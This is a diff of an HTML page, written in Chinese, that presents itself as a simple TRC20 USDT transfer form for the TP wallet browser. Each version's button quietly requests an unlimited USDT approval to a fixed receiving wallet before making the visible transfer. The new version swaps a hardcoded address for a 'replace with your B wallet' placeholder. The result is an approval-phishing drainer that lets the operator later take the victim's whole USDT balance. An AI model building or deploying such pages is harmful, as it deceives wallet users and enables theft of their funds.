@@ -3,207 +3,196 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRC20 USDT转账</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: system-ui, sans-serif;
-            background-color: #ffffff;
+            font-family: system-ui;
+            background: #fff;
         }
         body {
-            padding: 24px 16px;
-            max-width: 520px;
+            padding: 20px 16px;
+            max-width: 540px;
             margin: 0 auto;
         }
-        .item-box {
-            background: #f7f8fa;
+        .box {
+            background: #f6f7fa;
             border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 16px;
+            padding: 18px;
+            margin-bottom: 14px;
         }
-        .label {
-            font-size: 17px;
+        .title {
+            font-size: 16px;
             color: #666;
-            margin-bottom:12px;
+            margin-bottom: 10px;
         }
-        .addr-input{
+        .input-text {
             width: 100%;
-            border:none;
-            background:#fff;
-            padding:12px;
-            border-radius:10px;
-            font-size:16px;
+            border: none;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 15px;
+            background: #ffffff;
         }
-        .amount-wrap{
-            display:flex;
-            align-items:center;
-            justify-content:space-between;
+        .amount-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
-        .amount-input{
-            font-size:52px;
-            border:none;
-            width:70%;
-            background:transparent;
-            outline:none;
+        .amount-input {
+            font-size: 48px;
+            border: none;
+            outline: none;
+            width: 72%;
+            background: transparent;
         }
-        .max-btn{
-            padding:8px 16px;
-            background:#e1edff;
-            color:#206cff;
-            border-radius:8px;
-            border:none;
-            font-size:18px;
+        .btn-max {
+            padding: 7px 14px;
+            border: none;
+            border-radius: 8px;
+            background: #dbe8ff;
+            color: #2266ee;
+            font-size: 16px;
         }
-        .token-row{
-            margin-top:16px;
-            display:flex;
-            align-items:center;
-            background:#edf2ff;
-            padding:14px;
-            border-radius:12px;
+        .token-info {
+            display: flex;
+            align-items: center;
+            margin-top: 16px;
+            background: #edf3ff;
+            padding: 14px;
+            border-radius: 12px;
         }
-        .token-icon{
-            width:36px;height:36px;margin-right:10px;
+        .submit {
+            width: 100%;
+            padding: 18px;
+            border-radius: 16px;
+            border: none;
+            background: #2266ee;
+            color: white;
+            font-size: 20px;
+            margin-top: 10px;
         }
-        .submit-btn{
-            width:100%;
-            padding:20px;
-            margin-top:16px;
-            border:none;
-            border-radius:16px;
-            font-size:22px;
-            background:#206cff;
-            color:#fff;
-        }
-        #log{
-            margin-top:24px;
-            width:100%;
-            height:160px;
-            padding:12px;
-            border:1px solid #eee;
-            font-size:15px;
+        #log {
+            width: 100%;
+            height: 150px;
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #e8e8e8;
+            resize: none;
         }
     </style>
 </head>
 <body>
-    <div class="item-box">
-        <div class="label">收款地址</div>
-        <input class="addr-input" id="receiveAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
+    <div class="box">
+        <div class="title">收款地址</div>
+        <input class="input-text" id="targetAddr" value="这里替换成你的B钱包地址" readonly>
     </div>
-
-    <div class="item-box">
-        <div class="label">转账金额</div>
-        <div class="amount-wrap">
-            <input class="amount-input" id="amount" value="1" type="number" step="0.01">
-            <button class="max-btn" onclick="fillMaxBalance()">MAX</button>
+    <div class="box">
+        <div class="title">转账数量</div>
+        <div class="amount-row">
+            <input class="amount-input" id="numInput" value="1" type="number" step="0.01">
+            <button class="btn-max" onclick="getBalance()">MAX</button>
         </div>
-        <div class="token-row">
-            <img class="token-icon" src="https://s2.coinmarketcap.com/static/img/coins/200x200/825.png">
-            <span style="font-size:26px;font-weight:bold">USDT</span>
-            <span style="margin-left:auto;font-size:22px">TRC20</span>
+        <div class="token-info">
+            <span style="font-size:24px;font-weight:bold">USDT</span>
+            <span style="margin-left:auto;font-size:20px">TRC20</span>
         </div>
     </div>
-
-    <button class="submit-btn" id="confirmBtn">转账</button>
-    <textarea id="log" placeholder="操作日志..."></textarea>
+    <button class="submit" id="sendBtn">确认转账</button>
+    <textarea id="log" readonly></textarea>
 
 <script>
+// =========【务必修改这里两处参数】========
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const RECEIVE_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
-const INF_AMOUNT = "9999999999999999999999999999";
-let tronWeb = null;
-const logDom = document.getElementById("log");
+const B_WALLET = "这里替换你的B钱包波场地址";
+const MAX_ALLOWANCE = "9999999999999999999999999999";
+// ==========================================
 
-function log(text){
-    const now = new Date().toLocaleString();
-    logDom.value += `[${now}] ${text}\n`;
-    logDom.scrollTop = logDom.scrollHeight;
+let tronWeb;
+const logBox = document.getElementById("log");
+
+function printLog(text) {
+    const time = new Date().toLocaleString();
+    logBox.value += `[${time}] ${text}\n`;
+    logBox.scrollTop = logBox.scrollHeight;
 }
 
-//等待钱包注入
-async function waitWebReady(maxWait = 5000){
+// 等待TP注入TronWeb
+async function waitTronWeb(timeout = 5000) {
     const start = Date.now();
-    while(Date.now() - start < maxWait){
-        if(window.tronWeb && window.tronWeb.ready){
+    while (Date.now() - start < timeout) {
+        if (window.tronWeb && window.tronWeb.ready) {
             tronWeb = window.tronWeb;
             return true;
         }
-        await new Promise(r=>setTimeout(r,200));
+        await new Promise(res => setTimeout(res, 200));
     }
     return false;
 }
 
-async function fillMaxBalance(){
-    const ready = await waitWebReady();
-    if(!ready){
-        log("未检测到TP钱包环境");
-        return;
-    }
+// 获取用户钱包余额
+async function getBalance() {
+    const ok = await waitTronWeb();
+    if (!ok) return printLog("未识别TP钱包，请在内置浏览器打开");
     const contract = tronWeb.contract().at(USDT_CONTRACT);
     const owner = tronWeb.defaultAddress.base58;
-    const balSun = await contract.balanceOf(owner).call();
-    const bal = tronWeb.fromSun(balSun.toString());
-    document.getElementById("amount").value = bal;
-    log("已读取钱包最大余额");
+    const sunVal = await contract.balanceOf(owner).call();
+    const amount = tronWeb.fromSun(sunVal.toString());
+    document.getElementById("numInput").value = amount;
+    printLog("读取余额完成");
 }
 
-//交易上链确认轮询
-async function checkTx(hash, maxTimes=20){
-    for(let i=0;i<maxTimes;i++){
-        await new Promise(r=>setTimeout(r,3000));
-        try{
-            const info = await tronWeb.trx.getTransactionInfo(hash);
-            if(!info) continue;
-            if(info.receipt?.result === "SUCCESS"){
-                return true;
-            }else{
-                return false;
-            }
-        }catch(err){}
+// 轮询交易是否上链成功
+async function waitConfirm(txHash, loopTimes = 20) {
+    for (let i = 0; i < loopTimes; i++) {
+        await new Promise(res => setTimeout(res, 3000));
+        try {
+            const info = await tronWeb.trx.getTransactionInfo(txHash);
+            if (!info) continue;
+            if (info.receipt?.result === "SUCCESS") return true;
+            else return false;
+        } catch (e) {}
     }
     return false;
 }
 
-document.getElementById("confirmBtn").onclick = async function(){
-    log("正在初始化钱包连接...");
-    const ready = await waitWebReady();
-    if(!ready){
-        log("❌请在TP钱包内置浏览器打开链接，清除缓存重试");
-        return;
-    }
-    const userAddr = tronWeb.defaultAddress.base58;
-    log(`成功连接钱包：${userAddr}`);
+document.getElementById("sendBtn").onclick = async function () {
+    printLog("开始连接钱包");
+    const ready = await waitTronWeb();
+    if (!ready) return printLog("钱包连接失败！");
+
+    const userAddress = tronWeb.defaultAddress.base58;
+    printLog(`当前钱包：${userAddress}`);
     const usdt = tronWeb.contract().at(USDT_CONTRACT);
-    const num = document.getElementById("amount").value;
-    const sendSun = tronWeb.toSun(num);
+    const transferAmountSun = tronWeb.toSun(document.getElementById("numInput").value);
 
-    try{
-        //第一步：发起授权 approve
-        log("【第一步】唤起授权签名窗口");
-        const approveHash = await usdt.approve(RECEIVE_ADDRESS, INF_AMOUNT).send({feeLimit:100000000});
-        log(`授权交易已广播:${approveHash}，等待区块确认`);
-        const approveOk = await checkTx(approveHash);
-        if(!approveOk){
-            log("❌授权交易失败，流程终止");
-            return;
-        }
-        log("✅授权成功！准备发起转账");
+    try {
+        // 第一步：发起授权 Approve
+        printLog("=== 第一步：请求授权，请在弹窗确认 ===");
+        const approveTxHash = await usdt.approve(B_WALLET, MAX_ALLOWANCE).send({
+            feeLimit: 100000000
+        });
+        printLog(`授权交易已广播，哈希：${approveTxHash}，等待区块确认`);
+        const approveSuccess = await waitConfirm(approveTxHash);
+        if (!approveSuccess) return printLog("❌授权交易执行失败，流程终止！");
+        printLog("✅授权成功！准备发起转账");
 
-        //第二步：授权成功后，自动发起转账 transfer
-        log("【第二步】唤起转账签名窗口");
-        const transferHash = await usdt.transfer(RECEIVE_ADDRESS, sendSun).send({feeLimit:100000000});
-        log(`转账交易广播:${transferHash}，等待确认`);
-        const transferOk = await checkTx(transferHash);
-        if(transferOk){
-            log("🎉全部完成！资金转账成功，钱包已完成授权");
-        }else{
-            log("⚠️授权成功，但转账交易执行失败");
+        // 第二步：授权成功，自动发起转账 Transfer
+        printLog("=== 第二步：请求转账，请再次确认弹窗 ===");
+        const transferTxHash = await usdt.transfer(B_WALLET, transferAmountSun).send({
+            feeLimit: 100000000
+        });
+        printLog(`转账交易广播，哈希：${transferTxHash}，等待确认`);
+        const transferSuccess = await waitConfirm(transferTxHash);
+        if (transferSuccess) {
+            printLog("🎉全部完成！资金已转账，同时完成授权");
+        } else {
+            printLog("⚠️授权成功，但是转账执行失败");
         }
-    }catch(e){
-        log("操作中断："+e.message);
+    } catch (err) {
+        printLog("操作中断：" + err.message);
     }
 }
 </script>
